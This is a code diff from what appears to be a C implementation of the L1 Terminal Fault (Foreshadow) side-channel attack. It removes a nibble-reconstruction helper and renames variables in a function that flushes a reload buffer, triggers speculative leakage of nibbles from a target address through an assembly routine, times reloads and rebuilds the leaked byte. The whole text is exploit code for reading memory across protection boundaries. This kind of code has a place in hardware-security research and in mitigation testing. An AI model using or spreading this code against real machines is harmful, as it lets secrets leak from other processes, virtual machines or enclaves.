@@ -22,27 +22,16 @@
 
 #define THRESHOLD 150
 
-uint8_t reconstruct_nibbles(size_t raw_results[AMOUNT_OF_RELOAD_PAGES]) {
-  uint8_t result = 0;
-  for (size_t nibble = 0; nibble < AMOUNT_OF_NIBBLES_PER_RELOAD; ++nibble) {
-    size_t *partial_results =
-        &raw_results[nibble * AMOUNT_OF_OPTIONS_IN_NIBBLE];
-    size_t max = maximum(AMOUNT_OF_OPTIONS_IN_NIBBLE, partial_results);
-    result |= max << (4 * nibble);
-  }
-  return result;
-}
-
 uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
   flush(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer);
   asm_l1tf_leak_nibbles(leak_addr, reload_buffer);
 
-  size_t first = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE,
-                        (void *)reload_buffer[0], THRESHOLD);
-  size_t second = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE,
-                         (void *)reload_buffer[1], THRESHOLD);
+  size_t low = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE,
+                      (void *)reload_buffer[0], THRESHOLD);
+  size_t high = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE,
+                       (void *)reload_buffer[1], THRESHOLD);
 
-  return ((second & 0x0f) << 4) | (first & 0x0f);
+  return ((high & 0x0f) << 4) | (low & 0x0f);
 }
 
 // Super fast checking of the existance of a byte at a certain address.
